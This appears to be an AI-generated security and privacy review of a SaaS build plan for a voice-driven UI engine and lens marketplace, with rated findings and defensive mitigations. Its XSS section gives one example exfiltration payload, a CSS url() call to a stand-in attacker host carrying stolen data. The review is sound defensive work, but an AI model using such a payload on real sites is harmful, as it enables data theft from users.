# Security & Privacy Planning — Validation Report

> **Status:** PASS | **Model:** nvidia/nemotron-3-nano-30b-a3b:free | **Duration:** 22.9s
> **Files:** docs/ai-workflow/brainstorms/inception-morph-engine-plan-2026-07-08.md
> **Generated:** 7/8/2026, 12:48:04 AM

---

## Security Review of **Inception Canvas / Lens Foundry – Build‑Out Plan**  
*Prepared for: SwanStudios production SaaS (React + TS + styled‑components, Node/Express/Sequelize/PostgreSQL)*  
*Policy constraint: **ZERO PII TO LLMs** – no client‑identifying data may be transmitted to external AI providers.*

---  

### 1. PII / Sensitive‑Data Exposure  

| Finding | Rating | Why it matters (derived from the plan) | Mitigation |
|---------|--------|----------------------------------------|------------|
| **Voice‑intent capture** – The morph engine routes *spoken words* to APIs and then builds a **state document**. This implies client‑side microphone access and transmission of the audio snippet (or its transcription) to the backend or an LLM for intent parsing. | **HIGH** | The plan explicitly mentions “Voice/intent → API orchestration”. If the transcription step is performed by an external LLM, any spoken name, email, or health‑related phrase would be PII. Even if the transcription stays local, the **captured audio buffer** is a new surface that could be logged or leaked. | • Keep all voice processing **client‑side only** (Web Speech API) and never send raw audio or transcriptions to any external service. <br>• If a server‑side LLM is unavoidable, enforce **real‑time de‑identification**: strip speaker tags, replace any proper nouns with placeholders, and discard after state‑doc generation. <br>• Log only a hash of the intent token, never the original utterance. |
| **State‑document storage** – The generated JSON Lens is persisted (e.g., in IndexedDB, localStorage, or server‑side DB) and may contain **user‑specific preferences, session IDs, or derived personalization data**. | **MEDIUM** | Although the plan does not state that the JSON contains PII, any persisted user‑specific context (e.g., “last‑used lens”, “saved workflow”) can be considered **personal data** under GDPR/CCPA. | • Encrypt the JSON at rest (AES‑GCM) before writing to any storage. <br>• Scope the key to the authenticated user session; purge on logout. <br>• Do not store any fields that are not strictly required for morphing (e.g., remove any “user_id” or “email” fields). |
| **Marketplace / Lens sharing** – Third‑party authored lenses are “sellable” units. When a lens is shared, the **owner’s identifier** (e.g., a seller account) may be embedded in the Lens metadata. | **LOW** | The plan treats lenses as sellable assets; the platform will need to track *who* authored a lens. This is internal metadata, not user‑PII, but could expose **business‑level PII** if not properly isolated. | • Store author IDs only in an internal, access‑controlled table. <br>• Expose only a **public UUID** or hash to the client; never expose email or internal DB primary key. |

---  

### 2. Upload / File / Media Risks  

| Finding | Rating | Why it matters (derived from the plan) | Mitigation |
|---------|--------|----------------------------------------|------------|
| **No explicit file‑upload feature** is described in the plan. The only “media” mentioned is **Google Fonts** (external) and static HTML assets. | **LOW** | Because the plan does **not** introduce a user‑driven upload UI (e.g., image, video, PDF), there is no direct vector for malicious file ingestion. | • If future UI adds uploads, enforce: <br> - Server‑side virus scanning (ClamAV) <br> - Strict MIME‑type whitelist <br> - Store uploads outside the web‑root and serve via signed URLs. |
| **Potential indirect upload via “state document”** – The morph engine may accept **user‑provided JSON** to seed a lens. If a user can paste arbitrary JSON, it could be interpreted as a **script‑injection** vector. | **MEDIUM** | The plan mentions “state document (JSON) → render”. If the JSON is not sanitized, an attacker could embed `<script>` tags or `src` URLs that the renderer would execute. | • Treat any inbound JSON as **untrusted data**; parse with a safe schema validator (e.g., `ajv`). <br>• Strip any `script`, `style`, or `on*` attributes before insertion into the DOM. <br>• Render JSON data only via **React component props**, never via `innerHTML`. |

---  

### 3. Audio/Video/Biometric Privacy  

| Finding | Rating | Why it matters (derived from the plan) | Mitigation |
|---------|--------|----------------------------------------|------------|
| **Voice‑intent capture** (see above) is the only **biometric‑type** data mentioned. No video or raw biometric streams are referenced. | **HIGH** (for voice) | Voice is classified as a **biometric identifier** under many privacy regimes (e.g., BIPA, GDPR). The plan’s “voice/intent” flow could expose a user’s speech patterns, accents, or health‑related utterances. | • Implement **opt‑in consent** before enabling microphone access. <br>• Show a clear UI indicator (e.g., red dot) when recording is active. <br>• Immediately discard the audio buffer after intent extraction; never persist. |
| **No video or biometric data** is planned, so no additional privacy surface exists beyond voice. | — | — | — |

---  

### 4. Data at Rest  

| Finding | Rating | Why it matters (derived from the plan) | Mitigation |
|---------|--------|----------------------------------------|------------|
| **State‑document JSON** is persisted (client‑side or server‑side) as part of a **Lens**. This may contain user‑specific configuration, session tokens, or derived preferences. | **MEDIUM** | Persistent storage of user‑specific data without encryption could be read by an attacker who gains DB or filesystem access. | • Encrypt at rest using **AES‑256‑GCM** with per‑user keys derived from the auth session. <br>• Rotate encryption keys annually. <br>• Restrict DB read access to the **backend service account** only; no direct DB exposure to front‑end. |
| **Marketplace Lens metadata** (author ID, version, pricing) is stored in the PostgreSQL backend. | **LOW** | This is **business data**, not personal data, but could be considered sensitive if it reveals pricing strategies. | • Apply standard RBAC: only `admin` and `finance` roles may read pricing tables. <br>• Use column‑level encryption for `price` if required by compliance. |
| **Cache of rendered lenses** (e.g., CDN edge cache) may store static assets derived from user‑generated lenses. | **MEDIUM** | If a cached asset includes **personalized styling** (e.g., user‑specific color tokens), it could leak information when served to other users. | • Ensure cached assets are **user‑agnostic**; strip any per‑user CSS custom properties before caching. <br>• Use a **cache‑busting query string** that includes a hash of the user’s session ID, then purge when the session ends. |

---  

### 5. AuthZ / RBAC Enforcement  

| Finding | Rating | Why it matters (derived from the plan) | Mitigation |
|---------|--------|----------------------------------------|------------|
| **Multiple roles** are mentioned: *admin, trainer, client, etc.* The plan does **not** detail the exact permission matrix. | **HIGH** | Without explicit scoping, there is risk of **IDOR** or **cross‑tenant** data leakage (e.g., a trainer accessing another trainer’s lens drafts). | • Define a **fine‑grained policy** per role: <br> - `admin`: full access to Engine, Marketplace, Trust Layer. <br> - `trainer`: can view and test lenses but cannot publish. <br> - `client`: read‑only access to public lenses. <br>• Enforce **resource‑level permissions** in the backend (e.g., `lens.ownerId === req.user.id` before allowing edit). <br>• Use **UUID‑based identifiers** that are not guessable; never expose primary keys in URLs. |
| **Lens marketplace** allows third parties to sell lenses. The platform must isolate **tenant data** (e.g., separate DB schemas or row‑level security). | **MEDIUM** | If tenant isolation is not enforced, a malicious seller could query another tenant’s lens metadata. | • Use **Row‑Level Security (RLS)** in PostgreSQL: `CREATE POLICY tenant_isolation ON lenses USING (auth.uid() = owner_id);`. <br>• Audit all API endpoints that accept a `lensId` to verify ownership before returning data. |
| **Generated components carry “effect tier”** (T0–T4) that may trigger actions like `send`, `file`, `pay`. These actions must be gated by **approval** for T3/T4. | **HIGH** | If a user can bypass the approval step, they could trigger privileged actions (e.g., payment) on behalf of another user. | • Implement **server‑side approval workflow** for any T3/T4 request; the UI must present a **confirmation dialog** that includes the exact action description. <br>• Log every approval with immutable audit receipt (append‑only). <br>• Enforce that only **authenticated admin** can grant T3/T4 privileges. |

---  

### 6. Browser‑API / Permission Risks  

| Finding | Rating | Why it matters (derived from the plan) | Mitigation |
|---------|--------|----------------------------------------|------------|
| **Web Speech API** (voice intent) requires `microphone` permission. The plan does not discuss permission request flow. | **MEDIUM** | Browsers may prompt the user repeatedly; if the UI does not clearly explain why the permission is needed, users may grant it unintentionally, leading to privacy backlash. | • Request permission **only on first use** and store the grant state. <br>• Show a **modal** that explains the purpose (“Enable voice commands to build your app”) and links to a privacy notice. <br>• Provide a **fallback** (text‑based intent entry) for users who deny. |
| **View Transitions API** and **Framer Motion** are used for morph animations. These APIs can **interfere with navigation** and may keep event listeners alive after a page unload. | **LOW** | Improper cleanup could lead to **memory leaks** or **stale event handlers** that capture sensitive data. | • Register cleanup callbacks in `useEffect` (`return () => { … }`) to cancel animations and remove listeners when the component unmounts. <br>• Test on low‑end devices to ensure no “zombie” workers remain. |
| **URL routing** survives morphs (`/lens/<name>`). If a URL contains a **token** that encodes user‑specific data, it could be **shared** and expose that data to unintended viewers. | **MEDIUM** | The plan treats URLs as addressable lenses; a leaked URL could reveal a private lens or user‑specific state. | • Do **not** embed personally identifiable tokens in the URL path. Use opaque identifiers (e.g., UUID) that map to server‑side records with proper access checks. <br>• Add a **short‑lived token** (e.g., JWT) that expires after a configurable period. |

---  

### 7. Injection / XSS  

| Finding | Rating | Why it matters (derived from the plan) | Mitigation |
|---------|--------|----------------------------------------|------------|
| **User‑generated content** may be rendered inside the morph canvas (e.g., custom blocks, rich text). The plan mentions “rendering that state by assembling registry components”. | **HIGH** | If any part of the **state document** or marketplace‑provided HTML is inserted via `innerHTML`, an attacker could inject malicious scripts. | • **Never** use `innerHTML` for user data. <br>• Use **React** component props that automatically escape values. <br>• For any rich‑text blocks, sanitize with a library like **DOMPurify** before insertion. |
| **CSS custom properties** are used for theming (`var(--token, #fallback)`). While CSS cannot execute script, **CSS injection** can be leveraged for **side‑channel attacks** (e.g., exfiltrating data via `url()`). | **LOW** | The plan enforces a brand fallback and never hard‑codes hex values; however, an attacker could set a custom property to `url(https://evil.com/steal?data=…)`. | • Validate all CSS custom property values against a **whitelist** of allowed patterns before applying them to DOM elements. <br>• Disallow `url()` functions in user‑controlled styles. |
| **Dynamic script loading** is not mentioned, but the **Marketplace** may allow third‑party lenses that reference external scripts. | **CRITICAL** | If a third‑party lens can load arbitrary scripts, it defeats the **ZERO PII TO LLMs** policy and introduces a supply‑chain attack vector. | • **Disallow** any external script loading from third‑party lenses. <br>• All lenses must be **pre‑approved** and bundled with their own self‑contained code. <br>• Run lenses in a **sandboxed iframe** with `sandbox` attributes (`allow-scripts` only if whitelisted). |

---  

## Summary of Ratings  

| Category | Highest Rating |
|----------|----------------|
| PII / Sensitive‑Data Exposure | **HIGH** |
| Upload / File / Media Risks | **MEDIUM** |
| Audio/Video/Biometric Privacy | **HIGH** (voice) |
| Data at Rest | **MEDIUM** |
| AuthZ / RBAC Enforcement | **HIGH** |
| Browser‑API / Permission Risks | **MEDIUM** |
| Injection / XSS | **CRITICAL** (potential via marketplace lenses) |

---  

## Consolidated Mitigation Checklist  

1. **Voice Intent** – Keep transcription **client‑side only**; discard audio immediately; never send to external LLMs.  
2. **State Document** – Encrypt at rest; purge on logout; never store PII fields.  
3. **Marketplace Lenses** – Sandbox execution; forbid external script loads; enforce tenant‑level RLS.  
4. **RBAC** – Implement fine‑grained policies; verify ownership on every lens‑related endpoint; audit T3/T4 actions.  
5. **XSS Prevention** – Sanitize any user‑generated HTML; use React escaping; CSP with `script-src 'self'`.  
6. **Browser Permissions** – Prompt with clear UI; store consent; provide fallback; clean up event listeners.  
7. **URL Safety** – Use opaque, non‑identifying identifiers; short‑lived tokens; server‑side validation of every `lensId`.  
8. **Data‑at‑Rest Controls** – AES‑GCM encryption, key rotation, limited DB access, cache‑busting for user‑specific assets.  

---  

*All findings are derived strictly from the content of the provided plan document; no external assumptions have been made.*

---

*Part of SwanStudios 15-Brain Recursive Consensus System*
